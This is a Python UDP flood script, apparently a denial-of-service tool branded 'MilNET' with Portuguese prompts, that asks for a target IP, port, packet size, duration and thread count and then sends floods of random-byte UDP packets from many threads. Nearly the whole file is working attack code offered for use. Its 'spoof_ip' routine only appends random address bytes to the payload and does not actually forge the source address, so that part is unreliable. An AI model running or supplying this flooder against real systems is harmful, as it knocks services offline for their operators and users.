import socket
import os
import random
import threading
import struct
import time
from time import sleep

class Colors:
    reset = '\033[0m'
    vermelho = '\033[31m'
    verde = '\033[92m'

def print_line():
    print(Colors.verde + "=" * 90 + Colors.reset)

banner = """

                 ##   ##   ######  ####     ##   ##  #######   # ##### 
                 ### ###     ##     ##      ###  ##   ##   #  ## ## ## 
                 #######     ##     ##      #### ##   ##         ##    
                 ## # ##     ##     ##      #######   ####       ##    
                 ##   ##     ##     ##      ## ####   ##         ##    
                 ##   ##     ##     ##  ##  ##  ###   ##   #     ##    
                 ### ###   ######  #######  ##   ##  #######    ####
                 """                

os.system('clear')           
print(Colors.verde + banner + Colors.reset)
             
print_line()
print(f"{Colors.verde}                                › Preparando o ataque...")
print_line()

print(f"{Colors.verde}╔═══| MilNET | >")
ip = str(input(f"{Colors.verde}╚═══⟩ {Colors.reset}Target Ip: {Colors.verde}"))
print(f"{Colors.verde}╔═══| MilNET | >")
port = int(input(f"{Colors.verde}╚═══⟩ {Colors.reset}Target Porta: {Colors.verde}"))
print(f"{Colors.verde}╔═══| MilNET | >")
pack = int(input(f"{Colors.verde}╚═══⟩ {Colors.reset}Pacotes: {Colors.verde}"))
print(f"{Colors.verde}╔═══| MilNET | >")
sec = int(input(f"{Colors.verde}╚═══⟩ {Colors.reset}Time: {Colors.verde}"))
print(f"{Colors.verde}╔═══| MilNET | >")
thread_count = int(input(f"{Colors.verde}╚═══⟩ {Colors.reset}Threads: {Colors.verde}"))

os.system('clear')
print(Colors.verde + banner + Colors.reset)

sleep(0.1)
print("")
print_line()
print("")
print(Colors.verde + "┎❱")
print(Colors.verde + "┃" + Colors.reset + f" Ataque iniciado com {Colors.verde}sucesso!")
print(Colors.verde + "┃" + Colors.reset + f" Target Ip ▶ {Colors.verde}{ip}")
print(Colors.verde + "┃" + Colors.reset + f" Target porta ▶ {Colors.verde}{port}")
print(Colors.verde + "┃" + Colors.reset + f" Pacotes ▶ {Colors.verde}{pack} bytes")
print(Colors.verde + "┃" + Colors.reset + f" Threads ▶{Colors.verde}{thread_count}")
print(Colors.verde + "┃" + Colors.reset + f" Ataque em andamento...")
print(Colors.verde + "┖❱")
print("")
print_line()

def spoof_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def udp_bypass():
    global ip, port, sec
    c = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dados = os.urandom(pack)
    enviar_pacotes = 0
    start_time = time.time()

    while time.time() - start_time < sec:
        spoofed_ip = spoof_ip()
        pacotes = struct.pack("!4s4s", socket.inet_aton(spoofed_ip), socket.inet_aton(ip))
        for _ in range(2048):
            c.sendto(dados + pacotes, (ip, port))
            enviar_pacotes += 1
    c.close()

def start():
    udp_bypass()

threads = []
for x in range(thread_count):
    thread = threading.Thread(target=start)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
